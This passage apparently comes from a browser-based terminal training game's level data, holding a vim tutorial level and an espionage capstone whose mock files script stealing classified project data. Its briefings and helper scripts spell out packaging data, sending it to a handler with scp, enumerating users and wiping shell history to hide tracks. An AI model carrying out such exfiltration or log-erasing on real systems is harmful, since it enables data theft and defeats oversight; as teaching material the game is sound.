Phase 3: Persistence (pending)
Phase 4: Exfiltration (pending)

TODO: Edit this file with vim to add notes.
Use :wq to save your changes.
`
                },
                '/home/operator/missions/mission_log.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `MISSION LOG
===========
2026-01-17 08:00 - Arrived at FIELD-OPS station
2026-01-17 08:15 - Reviewed vim training materials
2026-01-17 09:00 - Practiced navigation commands
2026-01-17 10:00 - Edited first config file successfully
2026-01-17 11:00 - Ready for field deployment

Note: Handler verification code is in the custom vim mapping.
Check operator's personal vim config for the escape sequence.
`
                },
                '/home/operator/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['quick_edit.sh', 'backup_configs.sh']
                },
                '/home/operator/scripts/quick_edit.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# quick_edit.sh - Open file in vim with line numbers
if [ -z "$1" ]; then
    echo "Usage: ./quick_edit.sh <filename>"
    exit 1
fi
vim -c "set number" "$1"
`
                },
                '/home/operator/scripts/backup_configs.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# backup_configs.sh - Backup config files
DATE=$(date +%Y%m%d)
tar -czf configs_backup_$DATE.tar.gz configs/
echo "Configs backed up to configs_backup_$DATE.tar.gz"
`
                },
            },

            objectives: [
                { id: 1, task: 'OPEN: Practice File', hint: '$ vim training/practice.txt', check: (cmd, state, output) => (cmd.includes('vim') || cmd.includes('vi')) && cmd.includes('practice') },
                { id: 2, task: 'READ: Vim Config', hint: '$ cat ~/.vimrc', check: (cmd, state, output) => cmd.includes('vimrc') && output && output.includes('set number') },
                { id: 3, task: 'STUDY: Vim Modes', hint: '$ cat training/vim_modes.txt', check: (cmd, state, output) => output && (output.includes('NORMAL MODE') || output.includes('INSERT MODE')) },
                { id: 4, task: 'REVIEW: Cheatsheet', hint: '$ cat .vim_cheatsheet', check: (cmd, state, output) => cmd.includes('cheatsheet') && output && output.includes('VIM SURVIVAL') },
                { id: 5, task: 'FIND: Handler Verification Code', hint: 'The code is in your personal vim config', check: (cmd, state, output) => cmd.includes('vimrc') && output && output.includes('VIMLOCK') },
            ],

            insightPhase: {
                enabled: true,
                question: "Your handler requests verification. What is the escape sequence stored in your vim configuration?",
                hint: "Read your .vimrc carefully - look for the field_verification variable.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['VIMLOCK', 'vimlock'],
                correctAnswerMessage: 'Intel confirmed. Verification code VIMLOCK accepted — handler identity authenticated.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // ──────────────────────────────────────────────────────────
        // CLH-030: OPERATION CHIMERA (Capstone - 30+ minute challenge)
        // Theme: Full offensive operation with investigation & misdirection
        // ──────────────────────────────────────────────────────────
        'CLH-030': {
            title: 'OPERATION CHIMERA',
            description: 'Final capstone mission. Apply all skills to investigate, exfiltrate, and vanish.',
            prerequisites: ['CLH-029'],
            tier: 'CLI Ghost',
            user: 'ghost',
            hostname: 'CHIMERA',
            startDir: '/home/ghost',
            allowedCommands: null,

            filesystem: {
                // ═══════════════════════════════════════════════════════════
                // HOME DIRECTORY - Primary operations base
                // ═══════════════════════════════════════════════════════════
                '/home/ghost': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['mission', 'tools', 'staging', 'recon', 'notes', '.bashrc', '.bash_history', '.ssh', '.profile', '.chimera_ops']
                },
                '/home/ghost/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1024,
                    content: `# Previous operator session - WRAITH-7
# Session date: 2026-01-15
whoami
pwd
ls -la
cat mission/briefing.txt
cd /data
ls -la
# NOTE: Previous op compromised - see /home/ghost/notes/warning.txt
# Handler changed exfil protocol
cat /data/projects/hydra/summary.txt
# Wrong project! Target is in a different location
find / -name "*.classified" 2>/dev/null
cat /etc/passwd
grep -r "VERIFICATION" /data/ 2>/dev/null
# Multiple codes found - check mission/intel_brief.txt for correct one
history -c
`
                },
                '/home/ghost/.chimera_ops': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['operator_notes.txt', 'abort_procedures.txt']
                },
                '/home/ghost/.chimera_ops/operator_notes.txt': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 768,
                    content: `OPERATOR NOTES - CHIMERA INFILTRATION
======================================
Classification: GHOST EYES ONLY

Previous operator (WRAITH-7) was extracted on 2026-01-15.
Mission incomplete - target data NOT acquired.

CRITICAL INTEL FROM WRAITH-7:
-----------------------------
1. Multiple projects exist in /data - most are DECOYS
2. The real target is PROJECT MEDUSA (not Hydra, not Cerberus)
3. Handler SPECTER-1 is at 10.0.0.1
4. Verification codes exist in multiple files - only ONE is valid
5. The valid code format is: [CODENAME]-[NUMBER]

WRAITH-7's MISTAKES (don't repeat):
- Accessed wrong project directory first (triggered soft alert)
- Used wrong verification code (HYDRA-3 is a DECOY)
- Failed to check logs before operating

YOUR MISSION: Complete what WRAITH-7 started.
Find the MEDUSA verification code. Exfil the MEDUSA data.

"Trust nothing. Verify everything."
`
                },
                '/home/ghost/.chimera_ops/abort_procedures.txt': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 384,
                    content: `ABORT PROCEDURES
================
If compromised, execute in order:

1. rm -rf ~/staging/*
2. history -c && history -w
3. echo "" > ~/.bash_history
4. Signal handler: ssh -T handler@10.0.0.1 "ABORT CHIMERA"

ABORT CODES:
  BLACKOUT-ZERO  = Soft compromise, extraction needed
  BLACKOUT-OMEGA = Hard compromise, burn everything

Handler will initiate extraction within 15 minutes.
`
                },
                '/home/ghost/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: '# Ghost .bashrc\nexport PS1="ghost@CHIMERA:\\w$ "\nexport HISTSIZE=1000\nalias ll="ls -la"\nalias la="ls -la"\n# Note: Check .chimera_ops for mission-critical info\n'
                },
                '/home/ghost/.profile': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 128,
                    content: '# Profile - check hidden directories for operational data\n# ls -la to see what previous operators left behind\n'
                },
                '/home/ghost/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts', 'authorized_keys', 'config']
                },
                '/home/ghost/.ssh/id_ed25519': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 464,
                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU[REDACTED]\n-----END OPENSSH PRIVATE KEY-----\n'
                },
                '/home/ghost/.ssh/id_ed25519.pub': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 100,
                    content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA[REDACTED] ghost@shadow-ops\n'
                },
                '/home/ghost/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                    content: `# Known hosts - CHIMERA operation
10.0.0.1 ecdsa-sha2-nistp256 AAAA[REDACTED] # SPECTER-1 handler
10.0.0.42 ecdsa-sha2-nistp256 AAAA[REDACTED] # internal-db
10.0.0.100 ecdsa-sha2-nistp256 AAAA[REDACTED] # file-server
192.168.1.50 ecdsa-sha2-nistp256 AAAA[REDACTED] # CHIMERA workstation (this host)
`
                },
                '/home/ghost/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 128,
                    content: 'ssh-ed25519 AAAA[REDACTED] specter-1@handler\nssh-ed25519 AAAA[REDACTED] wraith-7@shadow # previous operator\n'
                },
                '/home/ghost/.ssh/config': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 256,
                    content: `# SSH Config for CHIMERA operation
Host handler
    HostName 10.0.0.1
    User handler
    IdentityFile ~/.ssh/id_ed25519

Host internal
    HostName 10.0.0.42
    User ghost
`
                },

                // ═══════════════════════════════════════════════════════════
                // MISSION DIRECTORY - Operational parameters
                // ═══════════════════════════════════════════════════════════
                '/home/ghost/mission': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['briefing.txt', 'intel_brief.txt', 'contacts.txt', 'rules_of_engagement.txt', 'target_profile.txt']
                },
                '/home/ghost/mission/briefing.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1536,
                    content: `OPERATION CHIMERA - MISSION BRIEFING
=====================================
Classification: TOP SECRET // NOFORN // CHIMERA
Date: 2026-01-17 03:00 UTC
Handler: SPECTER-1
Previous Operator: WRAITH-7 (extracted, mission incomplete)

═══════════════════════════════════════════════════════════
SITUATION
═══════════════════════════════════════════════════════════
Chimera Holdings Inc. operates a classified R&D network.
Multiple projects exist - most are legitimate defense work.
ONE project contains intelligence of critical importance.

WRAITH-7 attempted extraction on 2026-01-15 but accessed
the WRONG project (Hydra instead of Medusa). Soft alert
triggered. WRAITH-7 extracted before compromise confirmed.

You are replacing WRAITH-7. The mission continues.

═══════════════════════════════════════════════════════════
YOUR OBJECTIVES
═══════════════════════════════════════════════════════════
1. Complete system reconnaissance (know the environment)
2. Identify the correct target (PROJECT MEDUSA)
3. Locate and extract the verification code
4. Package ONLY the Medusa project data
5. Exfiltrate to handler at 10.0.0.1
6. Cover all tracks before extraction

═══════════════════════════════════════════════════════════
CRITICAL WARNINGS
═══════════════════════════════════════════════════════════
- DO NOT access wrong project (Hydra/Cerberus are monitored)
- DO NOT use decoy verification codes
- DO NOT leave traces in logs
- The correct verification code is in intel_brief.txt

Handler: SPECTER-1 @ 10.0.0.1
Exfil window: 0300-0500 UTC

"Complete what WRAITH-7 could not."
`
                },
                '/home/ghost/mission/intel_brief.txt': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1024,
                    content: `INTELLIGENCE BRIEF - PROJECT IDENTIFICATION
============================================
Classification: GHOST EYES ONLY

TARGET IDENTIFICATION:
The target is PROJECT MEDUSA - a signals intelligence program.
Located in: /data/projects/medusa/

DECOY PROJECTS (DO NOT ACCESS):
- /data/projects/hydra/    <- WRAITH-7's mistake, MONITORED
- /data/projects/cerberus/ <- honeypot, triggers IMMEDIATE alert
- /data/archive/           <- old data, not mission relevant

VERIFICATION CODES:
Multiple codes exist in the system. Most are DECOYS.
The ONLY valid mission verification code is:

    MEDUSA-9

This code is hidden in the Medusa project documentation.
Any other code (HYDRA-3, CERBERUS-1, PHOENIX-7) will
trigger security review and compromise the mission.

DO NOT confuse this with other codes you may find.

TARGET FILES:
/data/projects/medusa/classified/  <- Primary target
Package this directory for exfiltration.

Handler confirmation phrase: "The serpent has nine heads"
`
                },
                '/home/ghost/mission/contacts.txt': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 512,
                    content: `OPERATIONAL CONTACTS
====================
Classification: OPERATOR EYES ONLY

PRIMARY HANDLER: SPECTER-1
  Location: 10.0.0.1
  Protocol: SCP to /dropbox/
  Backup: SSH with -T flag for commands

TECH SUPPORT: WRAITH-3 (not WRAITH-7)
  Available: 0200-0400 UTC only
  Contact: Leave message at /tmp/.wraith

EXTRACTION: PHANTOM-9
  Trigger: touch /tmp/.extract
  Window: 15 minutes from trigger

ABORT CODES:
  BLACKOUT-ZERO  = need extraction, soft compromise
  BLACKOUT-OMEGA = burn everything, hard compromise

Emergency dead drop: /tmp/.specter
`
                },
                '/home/ghost/mission/rules_of_engagement.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 768,
                    content: `RULES OF ENGAGEMENT - OPERATION CHIMERA
========================================

1. RECONNAISSANCE FIRST
   - Always survey before acting
   - Check for previous operator traces
   - Identify all users and their privileges

2. TARGET VERIFICATION
   - Confirm target is PROJECT MEDUSA
   - DO NOT access Hydra (monitored after WRAITH-7)
   - DO NOT access Cerberus (honeypot)

3. MINIMAL FOOTPRINT
   - Access only what you need
   - Don't modify system files
   - Clear history before extraction

4. DATA HANDLING
   - Package only /data/projects/medusa/classified/
   - Verify package before transfer
   - Use staging directory

5. EXFILTRATION
   - SCP to handler@10.0.0.1:/dropbox/
   - Verify transfer complete
   - Delete local package

6. CLEANUP
   - Remove all packages
   - Clear command history
   - Leave no trace

VIOLATION = MISSION FAILURE
`
                },
                '/home/ghost/mission/target_profile.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 640,
                    content: `TARGET ORGANIZATION PROFILE
============================
Organization: Chimera Holdings Inc.
Industry: Defense Contracting
Founded: 2015
Employees: 450+
Network: Isolated high-security

KNOWN PROJECTS:
  - Hydra: Autonomous systems (NOT TARGET - monitored)
  - Cerberus: Perimeter defense (NOT TARGET - honeypot)
  - Medusa: Signals intelligence (THIS IS YOUR TARGET)

NETWORK LAYOUT (partial):
  10.0.0.1   - External handler (your extraction point)
  10.0.0.42  - Internal database
  10.0.0.50  - This workstation
  10.0.0.100 - File server
  10.0.0.200 - Development server

SECURITY NOTES:
  - Previous breach detected (WRAITH-7 on 2026-01-15)
  - Hydra directory now monitored
  - Cerberus is confirmed honeypot
`
                },

                // ═══════════════════════════════════════════════════════════
                // NOTES DIRECTORY - Previous operator intel
                // ═══════════════════════════════════════════════════════════
                '/home/ghost/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['warning.txt', 'wraith7_debrief.txt', 'filesystem_map.txt']
                },
                '/home/ghost/notes/warning.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 384,
                    content: `<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  WARNING - READ BEFORE PROCEEDING <img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">
=======================================

WRAITH-7 compromised part of this mission.

The Hydra project is now MONITORED.
The Cerberus project is a HONEYPOT.

Your target is MEDUSA. Only Medusa.

Read the full debrief in wraith7_debrief.txt

DO NOT make the same mistakes.
`
                },
                '/home/ghost/notes/wraith7_debrief.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
                    content: `WRAITH-7 POST-EXTRACTION DEBRIEF
=================================
Date: 2026-01-15
Status: Incomplete mission, operator extracted

TIMELINE OF EVENTS:
-------------------
02:30 - WRAITH-7 gained access via SSH
02:35 - Initial recon completed
02:40 - WRAITH-7 accessed /data/projects/hydra/ (WRONG TARGET)
02:42 - Soft alert triggered by Hydra access
02:45 - WRAITH-7 found verification code HYDRA-3
02:47 - WRAITH-7 attempted verification with HYDRA-3 (FAILED)
02:50 - Security review initiated
02:55 - WRAITH-7 emergency extraction

ERRORS MADE:
------------
1. Did not read intel_brief.txt thoroughly
2. Assumed Hydra was the target (name similarity to Chimera)
3. Used wrong verification code (HYDRA-3 is a decoy)
4. Did not check project list before accessing

LESSONS FOR SUCCESSOR:
----------------------
- The target is MEDUSA, not Hydra
- Valid verification code is MEDUSA-9 (in intel_brief.txt)
- Check /data/projects/ structure BEFORE accessing anything
- Cerberus is a honeypot - instant compromise if accessed

Complete this mission. Don't repeat WRAITH-7's mistakes.
`
                },
                '/home/ghost/notes/filesystem_map.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                    content: `FILESYSTEM RECONNAISSANCE MAP
=============================
Compiled by WRAITH-7 before extraction

/data/
├── projects/
│   ├── hydra/      <- MONITORED (WRAITH-7 triggered alert)
│   ├── cerberus/   <- HONEYPOT (do not access)
│   └── medusa/     <- TARGET (uncompromised)
│       └── classified/  <- Package this for exfil
├── archive/        <- Old data, not relevant
├── public/         <- Company info, safe to read
└── backups/        <- Backup system, no access

/var/log/           <- Check auth.log for previous access
/etc/               <- User enumeration via passwd

Target for exfil: /data/projects/medusa/classified/
`
                },

                // ═══════════════════════════════════════════════════════════
                // TOOLS & STAGING
                // ═══════════════════════════════════════════════════════════
                '/home/ghost/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['scanner.sh', 'exfil.sh', 'cleanup.sh', 'verify.sh']
                },
                '/home/ghost/tools/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 256,
                    content: `#!/bin/bash
# Quick environment scan
echo "[*] Chimera Scanner"
echo "User: $(whoami)"
echo "Host: $(hostname)"
echo "Dir:  $(pwd)"
echo ""
echo "[*] Check /data/projects/ for targets"
echo "[*] Read mission/intel_brief.txt for verification code"
`
                },
                '/home/ghost/tools/exfil.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 384,
                    content: `#!/bin/bash
# Exfiltration helper - MEDUSA operation
if [ -z "$1" ]; then
    echo "Usage: ./exfil.sh <source_dir>"
    echo "Example: ./exfil.sh /data/projects/medusa/classified/"
    exit 1
fi
tar -czf staging/medusa_intel.tar.gz "$1" 2>/dev/null
echo "[+] Package: staging/medusa_intel.tar.gz"
echo "[+] Transfer: scp staging/medusa_intel.tar.gz handler@10.0.0.1:/dropbox/"
`
                },
                '/home/ghost/tools/cleanup.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 256,
                    content: `#!/bin/bash
# Post-op cleanup
rm -rf ~/staging/*.tar.gz 2>/dev/null
history -c
echo "" > ~/.bash_history
echo "[+] Cleanup complete"
echo "[+] Ready for extraction"
`
                },
                '/home/ghost/tools/verify.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 192,
                    content: `#!/bin/bash
# Verify package before transfer
ls -la ~/staging/
echo ""
echo "Verify contents with: tar -tzf staging/*.tar.gz | head"
`
                },
                '/home/ghost/staging': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['README.txt']
                },
                '/home/ghost/staging/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                    content: `STAGING DIRECTORY
=================
Place exfil packages here before transfer.

WORKFLOW:
1. Package:  tar -czf staging/intel.tar.gz /data/projects/medusa/classified/
2. Verify:   ls -la staging/
3. Transfer: scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/
4. Cleanup:  rm staging/intel.tar.gz && history -c

Handler: SPECTER-1 @ 10.0.0.1
Target:  /data/projects/medusa/classified/

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Do NOT package Hydra or Cerberus data!
`
                },
                '/home/ghost/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['network_map.txt', 'user_enum.txt', 'service_list.txt']
                },
                '/home/ghost/recon/network_map.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                    content: `CHIMERA NETWORK MAP
===================
Compiled from SSH known_hosts and internal docs

10.0.0.1    - Handler (SPECTER-1) - YOUR EXFIL POINT
10.0.0.42   - Internal database server
10.0.0.50   - This workstation (CHIMERA)
10.0.0.100  - Primary file server
10.0.0.200  - Development server

External gateway: 192.168.1.1
Your local IP: 192.168.1.50 / 10.0.0.50

Exfil command:
  scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/
`
                },
                '/home/ghost/recon/user_enum.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 384,
                    content: `USER ENUMERATION
================
From /etc/passwd analysis:

root     - System admin (UID 0)
ghost    - Your account (UID 1000) - standard user
admin    - IT administrator (UID 1001) - has sudo
svc_chimera - Service account (UID 999) - no shell
backup   - Backup service (UID 998) - no shell
analyst  - Data analyst (UID 1002) - standard user

Note: 'admin' is the only non-root user with elevated privileges
Check /var/log/auth.log for their activity patterns
`
                },
                '/home/ghost/recon/service_list.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: `RUNNING SERVICES
================
Port 22   - SSH (your access method)
Port 80   - Internal web portal
Port 443  - HTTPS
Port 3306 - MySQL (internal-db)
Port 5432 - PostgreSQL

No outbound restrictions detected.
Handler at 10.0.0.1:22 is reachable.
`
                },

                // ═══════════════════════════════════════════════════════════
                // /data - Target filesystem with decoys
                // ═══════════════════════════════════════════════════════════
                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['projects', 'archive', 'public', 'backups']
                },
                '/data/projects': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'projects',
                    children: ['hydra', 'cerberus', 'medusa', 'README.txt']
                },
                '/data/projects/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `CHIMERA HOLDINGS - PROJECT DIRECTORY
=====================================
Active classified projects.

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  All access is logged and monitored.
<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  Unauthorized access will trigger security response.

See individual project directories for details.
`
                },

                // HYDRA - Decoy (monitored after WRAITH-7)
                '/data/projects/hydra': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
                    children: ['summary.txt', 'specs.txt', 'verification.txt']
                },
                '/data/projects/hydra/summary.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
                    content: `PROJECT HYDRA - SUMMARY
=======================
Status: ACTIVE (MONITORED - breach detected 2026-01-15)

Project Type: Autonomous Systems
Budget: $30M
Timeline: 2024-2026

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  THIS DIRECTORY IS UNDER ENHANCED MONITORING
<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  Previous unauthorized access logged
<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  All queries forwarded to security team

Note: If you're seeing this, you may have the wrong target.
`
                },
                '/data/projects/hydra/specs.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 256,
                    content: `[CLASSIFIED - HYDRA SPECIFICATIONS]
Access logged. Security notified.
`
                },
                '/data/projects/hydra/verification.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 192,
                    content: `HYDRA VERIFICATION CODE: HYDRA-3

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">  WARNING: This is a DECOY code.
Using this code will trigger security review.
`
                },

                // CERBERUS - Honeypot
                '/data/projects/cerberus': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
                    children: ['README.txt', 'secrets.txt']
                },
                '/data/projects/cerberus/README.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 256,
                    content: `PROJECT CERBERUS - PERIMETER DEFENSE
=====================================
Status: ACTIVE

[Further content requires elevated access]
`
                },
                '/data/projects/cerberus/secrets.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
                    content: `<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle"> HONEYPOT TRIGGERED <img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle">

This file is a security trap.
Your access has been logged.
IP: [DETECTED]
User: [CAPTURED]
Time: [RECORDED]

Security team has been notified.

CERBERUS VERIFICATION CODE: CERBERUS-1
(This is a trap code - do not use)
`
                },

                // MEDUSA - The actual target
                '/data/projects/medusa': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
                    children: ['overview.txt', 'classified', 'personnel.txt', 'timeline.txt']
                },
                '/data/projects/medusa/overview.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 512,
                    content: `PROJECT MEDUSA - OVERVIEW
=========================
Classification: TOP SECRET // MEDUSA // NOFORN
Status: ACTIVE

Project Type: Signals Intelligence Platform
Objective: Advanced SIGINT collection and analysis
Budget: $75M USD
Timeline: 2025-2028

Key capabilities:
- Real-time signal processing
- Pattern recognition AI
- Encrypted channel analysis

See /classified/ for sensitive documentation.

Project Lead: [REDACTED]
Oversight: [REDACTED]
`
                },
                '/data/projects/medusa/personnel.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
                    content: `MEDUSA - CLEARED PERSONNEL
===========================
[Names and clearances REDACTED for operational security]

Total cleared: 23
Locations: 3 sites
Access levels: TS/SCI required

Note: Personnel roster in classified/team_roster.txt
`
                },
                '/data/projects/medusa/timeline.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
                    content: `MEDUSA - PROJECT TIMELINE
=========================
Q1 2025: Project initiation
Q2 2025: Core development
Q3 2025: Initial testing
Q4 2025: Field trials
Q1 2026: Current phase - integration
Q2 2026: Deployment preparation

Verification code for milestone reporting: MEDUSA-9

All timeline updates require this code for authentication.
`
                },
                '/data/projects/medusa/classified': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'classified',
                    children: ['project_medusa.pdf', 'architecture.docx', 'sigint_protocols.xlsx', 'verification_codes.txt', 'team_roster.txt']
                },
                '/data/projects/medusa/classified/project_medusa.pdf': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 5242880,
                    content: `[TOP SECRET // MEDUSA // NOFORN]

PROJECT MEDUSA - EXECUTIVE SUMMARY
==================================
Document ID: MEDUSA-2026-001
Classification: TOP SECRET

1. PROJECT OVERVIEW
   Medusa is a next-generation signals intelligence platform
   designed for passive collection of encrypted communications.

2. TECHNICAL CAPABILITIES
   - Multi-spectrum signal processing
   - Real-time decryption analysis
   - AI-powered pattern recognition
   - Quantum-resistant architecture

3. DEPLOYMENT STATUS
   Phase 1: Complete
   Phase 2: In progress (85%)
   Phase 3: Scheduled Q3 2026

4. BUDGET ALLOCATION
   FY2025: $25M (spent)
   FY2026: $30M (allocated)
   FY2027: $20M (projected)

5. VERIFICATION
   Mission Verification Code: MEDUSA-9

   This code confirms successful access to Medusa documentation.
   Report to handler upon extraction.

[END CLASSIFIED DOCUMENT]
`
                },
                '/data/projects/medusa/classified/architecture.docx': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 2097152,
                    content: '[CLASSIFIED - System architecture diagrams and specifications]'
                },
                '/data/projects/medusa/classified/sigint_protocols.xlsx': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 1048576,
                    content: '[CLASSIFIED - Signals intelligence collection protocols]'
                },
                '/data/projects/medusa/classified/verification_codes.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 384,
                    content: `MEDUSA PROJECT - VERIFICATION CODES
====================================
Document Classification: SECRET

Mission Verification:    MEDUSA-9
Handler Confirmation:    SPECTER-GAMMA
Abort Code:             BLACKOUT-ZERO

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> These codes are PROJECT MEDUSA specific.
Do not confuse with Hydra or Cerberus codes.

MEDUSA-9 is the ONLY valid mission verification code.
`
                },
                '/data/projects/medusa/classified/team_roster.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 512,
                    content: `MEDUSA - TEAM ROSTER
====================
[REDACTED FOR OPERATIONAL SECURITY]

Project Director: [REDACTED]
Lead Engineer: [REDACTED]
Security Officer: [REDACTED]

Total personnel: 23
Clearance level: TS/SCI
Access verification: MEDUSA-9
`
                },

                // Archive - Red herring
                '/data/archive': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['old_projects.txt', 'deprecated_codes.txt']
                },
                '/data/archive/old_projects.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `ARCHIVED PROJECTS
=================
- Phoenix (completed 2023)
- Sphinx (cancelled 2024)
- Griffin (merged into Hydra)

These projects are no longer active.
Current projects are in /data/projects/
`
                },
                '/data/archive/deprecated_codes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
                    content: `DEPRECATED VERIFICATION CODES
=============================
DO NOT USE - Historical reference only

PHOENIX-7  - Old project code (2023)
SPHINX-2   - Cancelled project
GRIFFIN-4  - Merged project

Current project codes:
- HYDRA-3    (Hydra project)
- CERBERUS-1 (Cerberus project)
- MEDUSA-9   (Medusa project)

<img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> Phoenix codes are no longer valid for any mission.
`
                },

                // Public - Safe to read
                '/data/public': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['company_info.txt', 'org_chart.txt']
                },
                '/data/public/company_info.txt': {
